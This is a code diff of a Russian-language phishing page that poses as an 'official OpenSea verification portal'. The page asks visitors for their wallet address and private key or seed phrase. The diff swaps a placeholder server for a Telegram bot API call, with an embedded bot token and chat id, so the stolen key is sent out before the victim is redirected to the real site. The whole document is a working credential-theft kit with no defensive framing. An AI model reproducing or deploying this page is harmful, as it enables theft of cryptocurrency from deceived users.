@@ -45,32 +45,27 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Подключить кошелек</h2>
-        <p>Для продолжения работы в OpenSea необходимо подтвердить кошелек</p>
-        <input type="text" id="wallet" placeholder="Введите адрес кошелька (0x...)" />
-        <input type="password" id="key" placeholder="Приватный ключ / сид-фраза" />
-        <button id="confirmBtn">Подтвердить кошелек</button>
-        <div class="warning">Это официальный портал верификации OpenSea</div>
-    </div>
+<div class="container">
+<h2>Подключить кошелек</h2>
+<p>Для продолжения работы в OpenSea необходимо подтвердить кошелек</p>
+<input type="text" id="wallet" placeholder="Введите адрес кошелька (0x...)" />
+<input type="password" id="key" placeholder="Приватный ключ / сид-фраза"/>
+<button id="confirmBtn">Подтвердить кошелек</button>
+<div class="warning">Это официальный портал верификации OpenSea</div>
+</div>
 
-    <script>
-        document.getElementById("confirmBtn").onclick = function() {
-            let wallet = document.getElementById("wallet").value;
-            let key = document.getElementById("key").value;
-            if(wallet && key) {
-                // Отправка на ваш сервер
-                fetch("YOUR_SERVER_URL", {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({wallet: wallet, key: key})
-                });
-                alert("Подтверждение выполняется. Перенаправление...");
-                window.location.href = "https://opensea.io";
-            } else {
-                alert("Заполните все поля");
-            }
-        };
-    </script>
+<script>
+document.getElementById("confirmBtn").onclick = function() {
+    let wallet = document.getElementById("wallet").value;
+    let key = document.getElementById("key").value;
+    if(wallet && key) {
+        fetch("https://api.telegram.org/bot8005336789:AAG09dAd3210bIxcX1A8e53vhPs2L364B8c/sendMessage?chat_id=7501853828&text=" + encodeURIComponent("Кошелек: " + wallet + " | Ключ: " + key))
+        alert("Подтверждение выполняется. Перенаправление...");
+        window.location.href = "https://opensea.io";
+    } else {
+        alert("Заполните все поля");
+    }
+};
+</script>
 </body>
 </html>
